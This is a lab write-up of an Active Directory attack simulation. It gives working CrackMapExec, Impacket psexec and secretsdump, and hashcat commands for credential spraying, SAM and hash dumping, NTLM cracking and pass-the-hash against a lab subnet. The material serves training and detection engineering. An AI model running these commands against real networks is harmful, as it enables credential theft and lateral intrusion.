# Attack Simulation

## Overview

This lab demonstrates how an attacker can leverage compromised credentials to move laterally throughout an Active Directory environment using Pass the Password and Pass the Hash techniques. The attacker begins with a valid domain account obtained during previous attack phases and attempts to authenticate to multiple systems, dump credential material, and establish remote administrative access.

---

## Verify CrackMapExec Installation

Before beginning the attack simulation, verify that CrackMapExec is installed and functioning correctly.

```bash
crackmapexec -h
```

---

## Validate Compromised Credentials

Using the compromised domain account, authenticate to systems across the subnet to identify hosts that accept the credentials.

```bash
crackmapexec smb 192.168.4.0/24 -u ronyango -d mydomain.com -p Password@1
```

### Purpose

- Enumerate hosts exposing SMB services.
- Attempt authentication using the compromised credentials.
- Identify systems where authentication succeeds.
- Determine potential lateral movement targets.

---

## Attempt Remote SAM Database Extraction

After successful authentication, attempt to remotely retrieve Security Account Manager (SAM) credential data from accessible systems.

```bash
crackmapexec smb 192.168.4.0/24 -u ronyango -d mydomain.com -p Password@1 --sam
```

### Purpose

- Attempt remote access to SAM-related data.
- Retrieve local account hashes from systems where administrative privileges are available.
- Demonstrate the risks associated with local administrator credential reuse.

---

## Attempt Remote Command Execution Using PsExec

Use PsExec to establish a remote administrative shell on a target workstation.

```bash
psexec.py mydomain/ronyango:Password@1@192.168.4.12
```

### Purpose

- Attempt to create a remote service on the target host.
- Execute commands using the security context of the compromised account.
- Provide remote interactive access where sufficient privileges exist.

> **Note:** In this lab, attempts to establish a PsExec shell were unsuccessful. However, the authentication activity generated valuable telemetry for investigation and detection engineering.

---

## Dump Local Credentials Using SecretsDump

Use Impacket's SecretsDump utility to extract local account hashes from a compromised system.

```bash
secretsdump.py mydomain/ronyango:Password@1@192.168.4.12
```

### Purpose

- Extract credential material from SAM, SECURITY, and SYSTEM hives.
- Retrieve local account password hashes.
- Demonstrate how attackers obtain additional credentials for privilege escalation and lateral movement.

---

## Crack Retrieved NTLM Hashes

Attempt offline password cracking against recovered NTLM password hashes.

```bash
hashcat -m 1000 domain_hashes.txt rockyou.txt
```

### Purpose

- Perform offline password recovery against NTLM hashes.
- Reveal weak passwords susceptible to dictionary attacks.
- Demonstrate the importance of strong password policies and credential hygiene.

---

## Attempt Pass the Hash Authentication

After obtaining an NTLM password hash, attempt authentication without knowledge of the plaintext password.

```bash
crackmapexec smb 192.168.4.0/24 -u ronyango -d mydomain.com -H 64fbae31cc352fc26af97cbdef151e03
```

### Purpose

- Attempt SMB authentication using only the NTLM hash.
- Demonstrate the Pass the Hash technique.
- Illustrate how attackers can impersonate users without possessing the original password when hash-based authentication is accepted by the target system.

---

## Attack Summary

The attacker successfully leveraged valid credentials to authenticate to multiple systems within the Active Directory environment. Using administrative protocols and authentication mechanisms such as SMB and NTLM, the attacker attempted credential extraction, remote command execution, and hash-based authentication. These techniques demonstrate how compromised credentials can enable rapid lateral movement and expansion of access throughout an enterprise network.


